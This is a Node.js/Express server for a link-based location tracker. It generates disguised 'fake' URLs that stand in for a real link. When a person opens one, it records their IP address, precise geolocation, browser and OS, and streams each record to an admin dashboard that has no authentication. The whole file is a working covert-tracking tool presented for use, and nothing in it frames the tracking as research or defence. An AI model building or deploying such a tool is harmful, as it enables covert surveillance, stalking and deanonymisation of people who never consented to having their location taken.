const express = require('express');
const mongoose = require('mongoose');
const http = require('http');
const socketIo = require('socket.io');
const cors = require('cors');
const helmet = require('helmet');
const path = require('path');
const { v4: uuidv4 } = require('uuid');

const app = express();
const server = http.createServer(app);
const io = socketIo(server, {
  cors: {
    origin: "*",
    methods: ["GET", "POST"]
  }
});

// Middleware
app.use(helmet({
  contentSecurityPolicy: {
    directives: {
      defaultSrc: ["'self'"],
      styleSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net", "https://cdnjs.cloudflare.com"],
      scriptSrc: ["'self'", "'unsafe-inline'", "https://cdn.jsdelivr.net", "https://cdnjs.cloudflare.com"],
      connectSrc: ["'self'", "https://ipapi.co"],
      fontSrc: ["'self'", "https://cdnjs.cloudflare.com"],
      imgSrc: ["'self'", "data:", "https:"],
    },
  },
}));
app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// MongoDB connection
const mongoUri = process.env.MONGODB_URI || process.env.MONGO_URL || 'mongodb://localhost:27017/location_tracker';
console.log('Connecting to MongoDB:', mongoUri);
mongoose.connect(mongoUri, {
  useNewUrlParser: true,
  useUnifiedTopology: true,
  serverSelectionTimeoutMS: 5000,
  socketTimeoutMS: 45000,
}).then(() => {
  console.log('MongoDB connected successfully');
}).catch((error) => {
  console.error('MongoDB connection error:', error);
});

// Schema for tracking data
const trackingSchema = new mongoose.Schema({
  linkId: String,
  ip: String,
  userAgent: String,
  location: {
    latitude: Number,
    longitude: Number,
    accuracy: Number
  },
  timestamp: { type: Date, default: Date.now },
  city: String,
  country: String,
  browser: String,
  os: String
});

const TrackingData = mongoose.model('TrackingData', trackingSchema);

// Schema for generated links
const linkSchema = new mongoose.Schema({
  linkId: String,
  originalUrl: String,
  fakeUrl: String,
  clicks: { type: Number, default: 0 },
  createdAt: { type: Date, default: Date.now }
});

const GeneratedLink = mongoose.model('GeneratedLink', linkSchema);

// Routes
app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'public', 'admin.html'));
});

// Generate fake link
app.post('/api/generate-link', async (req, res) => {
  try {
    console.log('Generate link request received:', req.body);
    const { originalUrl } = req.body;
    
    if (!originalUrl) {
      return res.status(400).json({ success: false, error: 'Original URL is required' });
    }
    
    const linkId = uuidv4();
    const fakeUrl = `${req.protocol}://${req.get('host')}/track/${linkId}`;
    
    console.log('Creating new link:', { linkId, originalUrl, fakeUrl });
    
    const newLink = new GeneratedLink({
      linkId,
      originalUrl,
      fakeUrl
    });
    
    await newLink.save();
    console.log('Link saved successfully:', newLink);
    res.json({ success: true, fakeUrl, linkId });
  } catch (error) {
    console.error('Error generating link:', error);
    res.status(500).json({ success: false, error: error.message });
  }
});

// Track link click
app.get('/track/:linkId', async (req, res) => {
  try {
    const { linkId } = req.params;
    const link = await GeneratedLink.findOne({ linkId });
    
    if (!link) {
      return res.status(404).send('Link not found');
    }
    
    // Update click count
    link.clicks += 1;
    await link.save();
    
    // Send tracking page
    res.sendFile(path.join(__dirname, 'public', 'track.html'));
  } catch (error) {
    res.status(500).send('Error processing link');
  }
});

// Save tracking data
app.post('/api/track', async (req, res) => {
  try {
    const { linkId, location, userAgent, browser, os } = req.body;
    const ip = req.ip || req.connection.remoteAddress || req.socket.remoteAddress;
    
    const trackingData = new TrackingData({
      linkId,
      ip,
      userAgent,
      location,
      browser,
      os
    });
    
    await trackingData.save();
    
    // Emit real-time update to admin dashboard
    io.emit('newTrackingData', trackingData);
    
    res.json({ success: true });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Get all tracking data
app.get('/api/tracking-data', async (req, res) => {
  try {
    const data = await TrackingData.find().sort({ timestamp: -1 });
    res.json(data);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get all generated links
app.get('/api/links', async (req, res) => {
  try {
    const links = await GeneratedLink.find().sort({ createdAt: -1 });
    res.json(links);
  } catch (error) {
    res.status(500).json({ error: error.message });
  }
});

// Get original URL for redirect
app.get('/api/get-original-url/:linkId', async (req, res) => {
  try {
    const { linkId } = req.params;
    const link = await GeneratedLink.findOne({ linkId });
    
    if (!link) {
      return res.status(404).json({ success: false, error: 'Link not found' });
    }
    
    res.json({ success: true, originalUrl: link.originalUrl });
  } catch (error) {
    res.status(500).json({ success: false, error: error.message });
  }
});

// Socket.io connection for real-time updates
io.on('connection', (socket) => {
  console.log('Admin connected');
  
  socket.on('disconnect', () => {
    console.log('Admin disconnected');
  });
});

const PORT = process.env.PORT || 3000;
server.listen(PORT, () => {
  console.log(`Server running on port ${PORT}`);
  console.log(`Admin dashboard: http://localhost:${PORT}/admin`);
});
